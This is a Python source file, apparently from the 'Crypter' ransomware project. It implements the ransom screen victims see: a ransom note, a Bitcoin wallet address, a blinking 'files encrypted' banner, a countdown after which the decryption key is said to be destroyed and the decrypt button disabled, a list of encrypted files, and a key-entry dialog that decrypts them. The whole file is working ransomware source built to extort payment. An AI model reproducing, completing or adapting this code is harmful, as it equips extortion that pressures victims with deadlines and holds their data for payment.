"""Subclass of MainFrame, which is generated by wxFormBuilder."""
'''
@summary: Crypter: GUI Class
@author: MLS
'''

# Import libs
import wx
import os
import time

# Import Classes
import Base
from GuiAbsBase import MainFrame
from GuiAbsBase import ViewEncryptedFilesDialog
from GuiAbsBase import EnterDecryptionKeyDialog

# Implementing MainFrame
class Gui( MainFrame, ViewEncryptedFilesDialog, EnterDecryptionKeyDialog, Base.Base):
	'''
	@summary: Main GUI class. Inherits from GuiAbsBase and defines Crypter specific functions,
	labels, text, buttons, images etc. Also inherits from main Base for schema
	'''
	
	def __init__( self, image_path, start_time, encrypted_file_list, decrypter ):
		'''
		@summary: Constructor
		@param image_path: The path to look at to find resources, such as images.
		@param start_time: EPOCH time that the encryption finished.
		@param encrypted_file_list: List of encrypted files
		@param decrypter: Handle back to Main. For calling decryption method
		'''
		# Handle Params
		self.image_path = image_path
		self.start_time = start_time
		self.encrypted_file_list = encrypted_file_list
		self.decrypter = decrypter
		
		# Define other vars
		self.set_message_to_null = True
		
		# Super
		MainFrame.__init__( self, parent=None )
		
		# Update GUI visuals
		self.update_visuals()
		
		# Update events
		self.set_events()
		

	def set_events(self):
		'''
		@summary: Create button and timer events for GUI
		'''

		# Create and bind timer event
		self.key_destruction_timer = wx.Timer()
		self.key_destruction_timer.SetOwner( self, wx.ID_ANY )
		self.key_destruction_timer.Start( 500 )
		self.Bind(wx.EVT_TIMER, self.blink, self.key_destruction_timer)
		
		# Create button events
		self.Bind(wx.EVT_BUTTON, self.show_encrypted_files, self.ViewEncryptedFilesButton)
		self.Bind(wx.EVT_BUTTON, self.show_decryption_dialog, self.EnterDecryptionKeyButton)
		
	
	def show_decryption_dialog(self, event):
		'''
		@summary: Creates a dialog object to show the decryption dialog
		'''
		
		# Create dialog object
		self.decryption_dialog = EnterDecryptionKeyDialog(self)
		
		# Bind OK button to decryption process
		self.decryption_dialog.Bind(wx.EVT_BUTTON, self.decrypt, self.decryption_dialog.OkCancelSizerOK)
		self.decryption_dialog.Show()
		
		
	def decrypt(self, event):
		'''
		@summary: Handles the decryption process from a GUI level
		'''
		
		# Check for valid key
		key_contents = self.decryption_dialog.DecryptionKeyTextCtrl.GetLineText(0)
		if len(key_contents) < 32:
			self.decryption_dialog.StatusText.SetLabelText(self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_INVALID_KEY)
			return
		else:
			self.decryption_dialog.StatusText.SetLabelText(self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_DECRYPTING)
		
		wx.Yield()
		# Start the decryption
		# Disable dialog buttons
		self.decryption_dialog.OkCancelSizerOK.Disable()
		self.decryption_dialog.OkCancelSizerCancel.Disable()
		
		# Get list of encrypted files and update gauge
		encrypted_files_list = self.decrypter.get_encrypted_file_list()
		self.decryption_dialog.DecryptionGauge.SetRange(len(encrypted_files_list))

		# Iterate file list and decrypt
		decrypted_file_list = []
		for encrypted_file in encrypted_files_list:
			self.decrypter.decrypt_file(encrypted_file, key_contents)
			decrypted_file_list.append(encrypted_file)
			self.decryption_dialog.DecryptionGauge.SetValue(len(decrypted_file_list))
			wx.Yield()
			
		# Decryption complete
		self.decryption_dialog.StatusText.SetLabelText(self.GUI_DECRYPTION_DIALOG_LABEL_TEXT_FINISHED)
		self.decrypter.cleanup()
		
		# Re-enable button
		self.decryption_dialog.OkCancelSizerCancel.Enable()
		
		# Update main window
		self.key_destruction_timer.Stop()
		self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_DECRYPTED)
		self.FlashingMessageText.SetForegroundColour( wx.Colour(2, 217, 5) )
		self.KeyDestructionTime.SetLabelText(self.GUI_LABEL_TEXT_FILES_DECRYPTED)
		self.KeyDestructionTime.SetForegroundColour( wx.Colour(2, 217, 5) )
		
		# Disable decrypt button
		self.EnterDecryptionKeyButton.Disable()
		

	def show_encrypted_files(self, event):
		'''
		@summary: Creates a dialog object showing a list of the files that were encrypted
		'''
		
		# Create dialog object
		self.encrypted_files_dialog = ViewEncryptedFilesDialog(self)

		# If the list of encrypted files exists, load contents
		if os.path.isfile(self.encrypted_file_list):
			self.encrypted_files_dialog.EncryptedFilesTextCtrl.LoadFile(self.encrypted_file_list)
		# Otherwise set to none found
		else:
			self.encrypted_files_dialog.EncryptedFilesTextCtrl.SetLabelText(
				self.GUI_ENCRYPTED_FILES_DIALOG_NO_FILES_FOUND)
		
		
		self.encrypted_files_dialog.Show()

		
	def blink(self, event):
		'''
		@summary: Blinks the subheader text
		'''
		
		# Set message to blank
		if self.set_message_to_null:
			self.FlashingMessageText.SetLabelText("")
			self.set_message_to_null = False
		# Set message to text
		else:
			self.FlashingMessageText.SetLabelText(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED)
			self.set_message_to_null = True
		
		# Update the time remaining
		time_remaining = self.get_time_remaining()
		
		# If the key has been destroyed, update the menu text
		# TODO Test
		if not time_remaining:
			self.KeyDestructionTime.SetLabelText(self.GUI_LABEL_TEXT_KEY_DESTROYED)
			# Set timer colour to black
			self.KeyDestructionTime.SetForegroundColour( wx.SystemSettings_GetColour(
				wx.SYS_COLOUR_CAPTIONTEXT))
			# Disable decryption button
			self.EnterDecryptionKeyButton.Disable()
		else:
			self.KeyDestructionTime.SetLabelText(time_remaining)
		
		
	def get_time_remaining(self):
		'''
		@summary: Method to read the time of encryption and determine the time remaining
		before the decryption key is destroyed
		@return: time remaining until decryption key is destroyed
		'''
		
		seconds_elapsed = int(time.time() - int(self.start_time))
		
		_time_remaining = self.KEY_DESTRUCT_TIME_SECONDS - seconds_elapsed
		if _time_remaining <= 0:
			return None
		
		minutes, seconds = divmod(_time_remaining, 60)
		hours, minutes = divmod(minutes, 60)
		
		return "%d:%02d:%02d" % (hours, minutes, seconds)
		
		
	def update_visuals(self):
		'''
		@summary: Method to update the GUI visuals/aesthetics, i.e labels, images etc.
		'''

		# Set title
		self.CrypterTitleBitmap.SetBitmap(
			wx.Bitmap(
				os.path.join(self.image_path, self.GUI_IMAGE_TITLE),
				wx.BITMAP_TYPE_ANY))
		
		# Set flashing text initial label
		self.FlashingMessageText.SetLabel(self.GUI_LABEL_TEXT_FLASHING_ENCRYPTED)
		
		# Set Ransom Message
		self.RansomNoteText.SetValue(self.GUI_RANSOM_MESSAGE)

		# Set Logo
		self.LockBitmap.SetBitmap(
			wx.Bitmap(
				os.path.join(self.image_path, self.GUI_IMAGE_LOGO),
				wx.BITMAP_TYPE_ANY))

		# Set key destruction label
		self.KeyDestructionLabel.SetLabel(self.GUI_LABEL_TEXT_KEY_DESTRUCTION)

		# Set Wallet Address label
		self.WalletAddressLabel.SetLabel(self.GUI_LABEL_TEXT_WALLET_ADDRESS)
		
		# Set Wallet Address Value
		self.WalletAddressString.SetLabel(self.WALLET_ADDRESS)

		# Set Button Text
		self.ViewEncryptedFilesButton.SetLabel(self.GUI_BUTTON_TEXT_VIEW_ENCRYPTED_FILES)
		self.EnterDecryptionKeyButton.SetLabel(self.GUI_BUTTON_TEXT_ENTER_DECRYPTION_KEY)
		
		